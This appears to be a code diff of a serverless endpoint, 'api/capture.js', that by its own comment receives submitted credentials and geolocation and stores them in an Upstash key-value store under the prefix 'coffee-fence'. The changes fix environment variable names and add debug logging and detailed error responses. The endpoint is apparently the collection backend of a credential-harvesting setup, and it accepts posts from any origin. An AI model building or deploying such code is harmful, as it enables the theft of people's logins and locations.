@@ -1,11 +1,10 @@
 // api/capture.js — Receives credentials + geolocation, stores in Upstash KV
 
-const UPSTASH_URL = process.env.UPSTASH_KV_REST_URL;
-const UPSTASH_TOKEN = process.env.UPSTASH_KV_REST_TOKEN;
+const UPSTASH_URL = process.env.KV_REST_API_URL;
+const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
 const KV_PREFIX = "coffee-fence";
 
 export default async function handler(req, res) {
-    // CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -25,7 +24,10 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: 'Missing required fields' });
         }
 
-        // Generate unique entry ID
+        // Debug log to verify env vars
+        console.log('[+] UPSTASH_URL:', UPSTASH_URL ? 'configured' : 'MISSING');
+        console.log('[+] UPSTASH_TOKEN:', UPSTASH_TOKEN ? 'configured' : 'MISSING');
+
         const entryId = `entry_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
         const key = `${KV_PREFIX}:${entryId}`;
 
@@ -43,13 +45,19 @@ export default async function handler(req, res) {
         return res.status(200).json({ status: 'ok' });
 
     } catch (error) {
-        console.error('[!] Capture error:', error);
-        return res.status(500).json({ error: 'Internal server error' });
+        console.error('[!] Capture error:', error.message);
+        console.error('[!] Stack:', error.stack);
+        return res.status(500).json({ 
+            error: 'Internal server error',
+            message: error.message,
+            url: UPSTASH_URL ? 'set' : 'missing'
+        });
     }
 }
 
 async function upstashSet(key, value) {
     const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
+    console.log('[+] SET URL:', url);
     const resp = await fetch(url, {
         method: 'POST',
         headers: {
